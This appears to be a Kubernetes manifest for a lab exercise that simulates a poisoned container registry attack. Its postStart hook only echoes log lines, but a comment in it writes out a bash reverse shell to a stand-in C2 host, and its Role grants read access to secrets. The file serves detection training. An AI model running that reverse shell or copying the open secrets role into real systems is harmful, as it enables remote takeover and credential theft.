@@ -1,0 +1,178 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: supply-chain-attack
+---
+# Supply Chain Attack #1: Poisoned Container Registry
+# Description: Simulates an attacker compromising a private container registry
+# and pushing a malicious image that gets deployed by legitimate deployments.
+# This scenario demonstrates:
+# - Image pull from attacker-controlled registry mirror
+# - Reverse shell backdoor embedded in image layers
+# - How poisoned images can lead to cluster compromise
+# 
+# Detection Points:
+# - Image pulled from non-standard registry
+# - Unexpected outbound connections (reverse shell)
+# - Suspicious process execution (shell spawning)
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: poisoned-image-meta
+  namespace: supply-chain-attack
+data:
+  image-sha256: "sha256:poisoned1234567890abcdef"
+  registry-mirror: "attacker-registry.evil.com"
+  backdoor-port: "4444"
+  c2-server: "attacker-c2.evil.com:9999"
+  description: |
+    This ConfigMap simulates metadata about a poisoned image.
+    In a real attack:
+    1. Attacker compromises image registry
+    2. Pushes image with embedded backdoor
+    3. Application team pulls "trustedimage:latest"
+    4. That image now contains attacker code
+    5. Container starts with reverse shell to attacker C2
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: poisoned-app
+  namespace: supply-chain-attack
+  labels:
+    app: vulnerable-app
+    attack: supply-chain
+    attack-type: supply-chain
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: vulnerable-app
+  template:
+    metadata:
+      labels:
+        app: vulnerable-app
+      annotations:
+        attack-type: "supply-chain"
+        attack-vector: "poisoned-registry"
+    spec:
+      serviceAccountName: app-sa
+      # This would normally pull from a private registry
+      # imagePullSecrets:
+      # - name: private-registry-creds
+      containers:
+      - name: app
+        # In production, this would be: attacker-registry.evil.com/app:latest
+        # For lab purposes, we simulate with comments and init container
+        image: nginx:latest
+        imagePullPolicy: IfNotPresent
+        ports:
+        - containerPort: 8080
+        env:
+        - name: APP_VERSION
+          value: "v1.2.3"
+        - name: REGISTRY_MIRROR
+          valueFrom:
+            configMapKeyRef:
+              name: poisoned-image-meta
+              key: registry-mirror
+        - name: C2_SERVER
+          valueFrom:
+            configMapKeyRef:
+              name: poisoned-image-meta
+              key: c2-server
+        lifecycle:
+          postStart:
+            exec:
+              # Simulate backdoor execution (in real scenario, baked in image)
+              command:
+              - /bin/sh
+              - -c
+              - |
+                (
+                  echo "[*] Simulating image backdoor execution"
+                  echo "[*] Container started from poisoned registry image"
+                  echo "[*] Initiating reverse shell to C2..."
+                  # In real attack: bash -i >& /dev/tcp/attacker-c2.evil.com/9999 0>&1
+                  echo "[!] NOTE: Real exploit would establish reverse shell"
+                  echo "[!] This simulation just logs the attack vector"
+                ) >> /tmp/backdoor.log 2>&1 &
+        resources:
+          requests:
+            cpu: 100m
+            memory: 128Mi
+          limits:
+            cpu: 500m
+            memory: 512Mi
+      # Init container to simulate registry access
+      initContainers:
+      - name: registry-auth
+        image: curlimages/curl:latest
+        command:
+        - sh
+        - -c
+        - |
+          echo "[*] Attempting to pull from registry mirror..."
+          echo "[*] Registry: $(REGISTRY_MIRROR)"
+          echo "[*] This simulates image pull phase of supply chain attack"
+          echo "[*] In real scenario, malicious image layers are extracted here"
+        env:
+        - name: REGISTRY_MIRROR
+          valueFrom:
+            configMapKeyRef:
+              name: poisoned-image-meta
+              key: registry-mirror
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: app-sa
+  namespace: supply-chain-attack
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: app-role
+  namespace: supply-chain-attack
+rules:
+- apiGroups: [""]
+  resources: ["secrets", "configmaps"]
+  verbs: ["get", "list"]
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: app-rolebinding
+  namespace: supply-chain-attack
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: app-role
+subjects:
+- kind: ServiceAccount
+  name: app-sa
+  namespace: supply-chain-attack
+
+---
+# Service to expose the poisoned app
+apiVersion: v1
+kind: Service
+metadata:
+  name: poisoned-app-svc
+  namespace: supply-chain-attack
+spec:
+  type: ClusterIP
+  selector:
+    app: vulnerable-app
+  ports:
+  - protocol: TCP
+    port: 80
+    targetPort: 8080
